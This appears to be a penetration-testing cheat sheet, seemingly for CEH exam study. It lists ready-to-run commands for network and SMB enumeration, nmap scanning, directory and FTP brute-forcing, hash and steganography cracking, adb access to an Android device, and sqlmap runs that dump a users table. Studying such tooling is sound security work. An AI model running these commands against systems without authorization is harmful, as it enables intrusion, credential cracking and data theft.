# All the Commands You Need to Know

## Network Scanning & Enumeration

### How Many Machines Are Active in a Network
```bash
netdiscover -i 192.168.1.0/24
```

### Connect to RDP via CMD
```bash
mstsc
```

### Find DNS Records
[nslookup.io](https://www.nslookup.io/)

### Scan the Whole Website
```bash
skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://10.10.10.10:8080
```
**Options:**
- `-o` output
- `-S` wordlist

### Brute-force Directories or Files
```bash
gobuster dir -u 10.10.10.10 -w /usr/share/dirb/wordlists/common.txt -x .txt
```
**OR**
```bash
uniscan -u http://10.10.10.12:8080/CEH -q   # for directories
uniscan -u http://10.10.10.12:8080/CEH -we  # enable file check like robots.txt and sitemap.xml
```

### Download a File from a Server
```bash
wget http://10.10.10.10/secret.txt
```

## Authentication & Access

### FTP Login
```bash
ftp <ip>
get <file_name>
```

### SSH Login
```bash
ssh username@10.10.10.10
```

## Nmap Scanning
```bash
nmap -A 10.10.10.10   # Aggressive scan (Traceroute, T4, OS)
nmap -sC 10.10.10.10  # Service scan
nmap -sV 10.10.10.10  # Version scan
nmap -sP 10.10.10.10/24  # Ping scan to see active hosts
nmap -sL 10.10.10.10  # Hostnames
nmap -oN <filename>  # Save output to file
nmap -F 10.10.10.10  # Fast scan
nmap -O 10.10.10.10  # OS detection
```

## Hash Cracking
```bash
hashid -m <hash>  # Identify hash type
hashcat -m <mode> -a 0 <hash> /usr/share/wordlist/rockyou.txt
```
[Crackstation](https://crackstation.net)  
[Hashes.com](https://hashes.com)  
[CyberChef](https://gchq.github.io/CyberChef/)

## Enumeration Tools
- Global network inventory
- Netbios enumerator
- Hyena
- Superscan
- Advanced IP Scanner

## Nmap SMB Scripts
```bash
nmap --script smb-os-discovery.nse -p445 <ip>
nmap --script smb-enum-users.nse -p445 <ip>
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.19.21
smbclient //10.10.19.21/anonymous
smbget -R smb://10.10.19.21/anonymous
```

## Enum4Linux
```bash
enum4linux -u martin -p apple -U 10.10.10.12  # Get user list
enum4linux -u martin -p apple -o 10.10.10.12  # Get OS info
enum4linux -u martin -p apple -P 10.10.10.12  # Get password policy info
enum4linux -u martin -p apple -G 10.10.10.12  # Get groups and members info
enum4linux -u martin -p apple -S 10.10.10.12  # Get share list info
enum4linux -u martin -p apple -a 10.10.10.12  # Get all data
```

## WordPress Enumeration
```bash
wpscan --url http://[IP]:8080/CEH --enumerate u
```

## Vulnerability Analysis
```bash
nikto -h http://testphp.vulnweb.com/login.php -Tuning 1
```

## Brute-force Attacks
```bash
hydra -L username -P /usr/share/wordlists/rockyou.txt ftp://xiotz.com
```

## Cryptography Tools
- HashCalc
- MD5 Calculator
- CrypTool (decode .hex files)
- BCTextEncoder (decrypt text using a secret key)
- VeraCrypt (volume encryption)

## Steganography
```bash
steghide embed -ef <filename> -cf <image> -p <passphrase>
steghide extract -sf <image>  # Extract hidden data
stegcracker <image> /usr/share/wordlists/rockyou.txt  # Crack passphrase
sha256sum <filename>  # Get file hash
```
[Online Steganography Tool](https://futureboy.us/stegano/decinput.html)

## Android Hacking
```bash
./adb tcpip 5555
./adb connect 192.168.43.117:5555
./adb devices
./adb -d shell
ls
cd sdcard/dcim/camera
```
### Transfer Files
```bash
./adb push C:\platform-tools\ota.zip /sdcard/Download  # PC to Android
./adb pull /sdcard/Download/magisk_patched.img C:\platform-tools  # Android to PC
```

## SQLMap - SQL Injection Testing
```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs  # Find databases
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables  # Find tables
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns  # Find columns
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump  # Dump entire table
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump  # Dump specific column
```
